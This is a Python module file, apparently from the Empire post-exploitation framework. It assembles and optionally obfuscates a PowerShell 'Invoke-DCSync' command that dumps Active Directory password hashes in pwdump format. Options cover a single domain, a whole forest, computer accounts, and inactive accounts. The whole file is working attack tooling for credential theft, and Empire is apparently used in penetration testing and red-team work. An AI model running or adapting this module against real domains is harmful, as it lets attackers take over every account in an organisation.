from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = "Invoke-DCSync -PWDumpFormat "

        if params["Domain"] != "":
            script_end += " -Domain " + params["Domain"]

        if params["Forest"] != "":
            script_end += " -DumpForest "

        if params["Computers"] != "":
            script_end += " -GetComputers "

        if params["Active"] == "":
            script_end += " -OnlyActive:$false "

        outputf = params.get("OutputFunction", "Out-String")
        script_end += f" | {outputf};"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
